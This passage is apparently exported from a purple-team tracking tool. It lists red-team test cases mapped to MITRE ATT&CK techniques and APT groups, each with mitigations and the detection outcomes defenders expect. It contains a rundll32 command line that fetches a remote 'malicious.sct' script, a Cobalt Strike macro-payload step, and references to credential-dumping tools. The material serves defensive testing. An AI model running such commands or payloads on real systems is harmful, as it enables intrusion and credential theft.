SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d979d988-8441-4093-b913-e593ba2bdf03","vectrId":"d979d988-8441-4093-b913-e593ba2bdf03","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"d979d988-8441-4093-b913-e593ba2bdf03","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing via Service","variant":"Magic Hound - Spearphishing via Service","objective":"Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) used various social media channels to spearphish victims.Anti-virus can also automatically quarantine suspicious files.\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails with malicious links.\n---\nDetermine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847","relationship--e931afd2-35b2-4f9f-9b7c-88093e822c7b","relationship--a408e9fc-44fb-4563-a86f-2eb17ff0832d","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--f1883831-ea71-4e27-ab6a-aa10a7fd7df4","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0da51973-98f8-4a5e-8217-da19f7bc64b6","course-of-action--c861bcb1-946f-450d-ab75-d4e3c1103a56","relationship--b5c8909c-3fe2-4dbf-bf8a-c620ddfe2bed","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Counter Threat Unit Research Team. (2017, July 27). The Curious Case of Mia Ash: Fake Persona Lures Middle Eastern Targets. Retrieved February 26, 2018. https://www.secureworks.com/research/the-curious-case-of-mia-ash"],"mitreId":"T1194"},"blueTeam":{"successfulDetectionBehaviors":["Use signatures or heuristics to detect malicious software.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Determine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.\n\nBecause this technique involves use of legitimate services and user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. To prevent the downloads from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--dbc0c5e1-97df-49a3-ae1f-ad7117613ddc","vectrId":"dbc0c5e1-97df-49a3-ae1f-ad7117613ddc","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"dbc0c5e1-97df-49a3-ae1f-ad7117613ddc","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Network Sniffing","variant":"APT33 - Network Sniffing - PoshC2 - Empire","objective":"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used SniffPass to collect credentials by sniffing network traffic.Use multi-factor authentication wherever possible.\n---\nEnsure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) contains a module for taking packet captures on compromised hosts.\n---\n[Empire](https://attack.mitre.org/software/S0363) can be used to conduct packet captures on target hosts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529","relationship--b1ca60ac-cef2-467e-843c-5732d8885626","relationship--0ccddf91-2cf3-4801-a10b-ca4d253f2c8c","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--c1600f3f-6c21-4c5b-82fe-a4514785f6bb","course-of-action--46b7ef91-4e1d-43c5-a2eb-00fa9444f6f4","relationship--70d446a5-349f-4b70-9446-90e872adac42","course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--f9fb0958-7f80-4bd5-80c2-9665124f1d0e","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--9be360bb-8ac4-4357-8795-0736b447293c","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf"],"mitreId":"T1040"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Ensure that all wireless traffic is encrypted appropriately. Use Kerberos, SSL, and multifactor authentication wherever possible. Monitor switches and network for span port usage, ARP/DNS poisoning, and router reconfiguration.\n\nIdentify and block potentially malicious software that may be used to sniff or analyze network traffic by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Protect sensitive information with strong encryption."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--dcffc1f1-2aaa-4eb5-99b3-c55d3bcfbb41","vectrId":"dcffc1f1-2aaa-4eb5-99b3-c55d3bcfbb41","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"dcffc1f1-2aaa-4eb5-99b3-c55d3bcfbb41","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Rundll32","variant":"CopyKittens - Rundll32","objective":"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5","relationship--896cd1de-ffa7-4f69-a981-2859cc756601","relationship--aba9ea33-32fb-4fb6-a7af-3d8902596fc8","course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3","relationship--98c18956-03d7-49e5-93b2-44351682331d","course-of-action--8c918d8a-11c5-4ffd-af10-e74bc06bdfae","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018. https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/","ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf","Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017. https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"],"mitreId":"T1085"},"blueTeam":{"successfulDetectionBehaviors":["Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.","Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting. (Citation: Secure Host Baseline EMET)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--dd31603d-099d-498e-813a-5286b60d8d1f","vectrId":"dd31603d-099d-498e-813a-5286b60d8d1f","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"dd31603d-099d-498e-813a-5286b60d8d1f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Connection Proxy","variant":"APT39 - Connection Proxy","objective":"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.\n\nInternal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.","command":"[APT39](https://attack.mitre.org/groups/G0087) used custom tools to create SOCK5 proxies between infected hosts.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea","relationship--e2ebd73f-9198-49c7-b446-00478a466e78","relationship--eede138c-9745-453c-a8b5-684b696c2ad0","course-of-action--d75a3d1b-b536-4f15-a23c-f4bcc17837b8","relationship--d50b5687-ea69-40f9-86f3-eecd7e015bac","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015. http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"],"mitreId":"T1090"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e151101a-09f5-4756-ab7a-681a50e106d2","vectrId":"e151101a-09f5-4756-ab7a-681a50e106d2","name":"","offset":0,"createTime":1.578425409968E12,"updateTime":1.578425409968E12,"phaseId":"b01606fb-b984-4415-ac33-456e12fecea9","templateId":"e151101a-09f5-4756-ab7a-681a50e106d2","icon":"icons/fishing.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Phishing Payload","variant":"Cobalt Strike Standard Macro - Attachment","objective":"Send phishing email to victim containing malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.","command":"Attacks --> Packages --> MS Office Macro\nCopy code to office document","likelihood":"Low","risk":"Low","internalExternal":"External","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1193"},"blueTeam":{"successfulDetectionBehaviors":["1) Malicious document blocked/quarantined by email gateway, or email delivered but filtered to junk folder.  Malicious URLs are rewritten and behavior analyzed in sandbox consistent with attachments."],"expectedDetectionLayerIds":["0eaac669-7d11-4397-8011-a9cce6e577be"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten)"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e1554117-5884-4d3a-b11b-3fb497931d20","vectrId":"e1554117-5884-4d3a-b11b-3fb497931d20","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"e1554117-5884-4d3a-b11b-3fb497931d20","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credentials in Files","variant":"MuddyWater - Credentials in Files - LaZagne - Mimikatz","objective":"Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\n\n\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has run a tool that steals passwords saved in victim email.Establish an organizational policy that prohibits password storage in files.\n---\nPreemptively search for files containing passwords and take actions to reduce the exposure risk when found.\n---\nRestrict file shares to specific directories with access only to necessary users.\n---\nEnsure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers.\n---\nRemove vulnerable Group Policy Preferences.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from browsers, chats, databases, mail, and WiFi.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002)'s <code>DPAPI</code> module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["c32562cb-348d-4d0e-85d3-52e2118459d7","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c","relationship--ee05131d-83bd-4eb5-b6c1-0f6925045b95","relationship--913e7eac-c12f-4db7-b5f4-b23c8fe05729","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--f76660fd-2b21-415f-b0dd-a98f9e80055b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--862de207-08e7-402a-ad23-90f520f11299","course-of-action--987988f0-cf86-4680-a875-2f6456ab2448","relationship--397bdc3e-3c63-4311-a509-e019c655e836","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--5a491b91-739f-498b-b8f2-b14aaea07893","course-of-action--0472af99-f25c-4abe-9fce-010fa3450e72","relationship--cf828aff-2e43-491b-a4d7-4cec93e193cd","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--b0f355cc-e11f-4027-9db3-59ec64cd367f","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--028c3adf-4182-4250-9642-2ce5c448f710","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["(Citation: GitHub LaZange Dec 2018)","CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014. http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019. https://posts.specterops.io/head-in-the-clouds-bd038bb69e48","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Microsoft. (2014, May 13). MS14-025: Vulnerability in Group Policy Preferences could allow elevation of privilege. Retrieved January 28, 2015. http://support.microsoft.com/kb/2962486","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1081"},"blueTeam":{"successfulDetectionBehaviors":["Set and enforce secure password policies for accounts.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences. (Citation: Microsoft MS14-025)","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e1aebb2e-6f07-4018-ab8c-a9908511cb66","vectrId":"e1aebb2e-6f07-4018-ab8c-a9908511cb66","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"e1aebb2e-6f07-4018-ab8c-a9908511cb66","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Software Packing","variant":"APT39 - Software Packing","objective":"Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\n\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)","command":"[APT39](https://attack.mitre.org/groups/G0087) has repacked a modified version of [Mimikatz](https://attack.mitre.org/software/S0002) to thwart anti-virus detection.Employ heuristic-based malware detection. Ensure updated virus definitions and create custom signatures for observed malware.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88","relationship--4bc2e50e-0753-497f-9ec0-af270abe2af1","relationship--35572bdc-c7a2-442b-8d9a-7691317b6982","course-of-action--c95c8b5c-b431-43c9-9557-f494805e2502","relationship--eb7829cd-ff2e-4dc5-87e7-9006327472e1","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Executable compression. (n.d.). Retrieved December 4, 2014. http://en.wikipedia.org/wiki/Executable_compression","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. 